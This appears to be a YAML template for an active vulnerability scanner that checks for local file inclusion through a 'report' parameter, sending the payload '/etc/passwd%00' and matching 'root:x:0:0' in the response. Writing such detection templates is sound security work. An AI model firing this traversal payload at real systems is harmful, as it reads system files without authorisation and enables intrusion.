id: lfi6-1097
name: 'Traversal in report'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via report'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      report:
        - '/etc/passwd%00'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
